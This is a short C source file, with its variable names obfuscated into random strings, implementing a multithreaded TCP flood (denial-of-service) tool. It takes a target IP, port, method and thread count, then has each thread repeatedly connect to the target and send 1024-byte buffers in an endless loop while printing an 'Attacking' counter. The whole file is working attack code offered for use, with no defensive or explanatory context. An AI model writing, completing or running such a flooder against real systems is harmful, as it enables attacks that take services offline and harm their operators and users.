#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<unistd.h>
#include<arpa/inet.h>
#include<pthread.h>
#include<errno.h>
#define sbktddoubaui 100
#define zqwxqwjevjxv 1024
#define jtmrnbitjkik 3
#define dmkwyekwrirw "\033[32m"
#define mgprgvqwqdrm "\033[31m"
#define vychjuqbetkj "\033[0m"
typedef struct{char*dxeajveruhft;int tcuscblucrdu;int kkmsvrunpsfp;char*syszfmaqggpc;}ThreadData;int kvvkppqqwxnh=0;void*amxgcregrxwc(void*tbqdomnlcwft){ThreadData*hufzxnfblvpl=(ThreadData*)tbqdomnlcwft;char lgqetragqsqz[zqwxqwjevjxv];int qbndcuepolyb;struct sockaddr_in server;while(1){qbndcuepolyb=socket(AF_INET,SOCK_STREAM,0);if(qbndcuepolyb==-1){perror("Could not create socket");sleep(1);continue;}server.sin_addr.s_addr=inet_addr(hufzxnfblvpl->dxeajveruhft);server.sin_family=AF_INET;server.sin_port=htons(hufzxnfblvpl->tcuscblucrdu);if(connect(qbndcuepolyb,(struct sockaddr*)&server,sizeof(server))<0){perror("Connect failed");close(qbndcuepolyb);sleep(1);continue;}while(1){if(send(qbndcuepolyb,lgqetragqsqz,zqwxqwjevjxv,0)<0){perror("Send failed");break;}kvvkppqqwxnh++;}close(qbndcuepolyb);}return NULL;}int main(int yowaabacvsli,char*pviwykxfrqfk[]){if(yowaabacvsli<5){printf("Usage: %s <target_ip> <target_port> <method> <threads>\n",pviwykxfrqfk[0]);printf("Methods: tcp, http, udp\n");return 1;}char*dxeajveruhft=pviwykxfrqfk[1];int tcuscblucrdu=atoi(pviwykxfrqfk[2]);char*syszfmaqggpc=pviwykxfrqfk[3];int rnynrfegrorz=atoi(pviwykxfrqfk[4]);if(rnynrfegrorz>sbktddoubaui){printf("Too many threads, max is %d\n",sbktddoubaui);return 1;}pthread_t hdcnzdttxbrz[sbktddoubaui];ThreadData qyrysmnkeumr[sbktddoubaui];printf("Starting %s flood with %d threads to %s:%d\n",syszfmaqggpc,rnynrfegrorz,dxeajveruhft,tcuscblucrdu);for(int faikyzgwkcma=0;faikyzgwkcma<rnynrfegrorz;faikyzgwkcma++){qyrysmnkeumr[faikyzgwkcma].dxeajveruhft=dxeajveruhft;qyrysmnkeumr[faikyzgwkcma].tcuscblucrdu=tcuscblucrdu;qyrysmnkeumr[faikyzgwkcma].kkmsvrunpsfp=faikyzgwkcma;qyrysmnkeumr[faikyzgwkcma].syszfmaqggpc=syszfmaqggpc;if(strcmp(syszfmaqggpc,"tcp")==0){if(pthread_create(&hdcnzdttxbrz[faikyzgwkcma],NULL,amxgcregrxwc,(void*)&qyrysmnkeumr[faikyzgwkcma])!=0){perror("Failed to create thread");return 1;}}else{printf("Unknown method: %s\n",syszfmaqggpc);return 1;}}while(1){printf("\r%sAttacking%s | [ %s%d%s ]",dmkwyekwrirw,vychjuqbetkj,mgprgvqwqdrm,kvvkppqqwxnh,vychjuqbetkj);fflush(stdout);sleep(1);}for(int faikyzgwkcma=0;faikyzgwkcma<rnynrfegrorz;faikyzgwkcma++){pthread_join(hdcnzdttxbrz[faikyzgwkcma],NULL);}return 0;}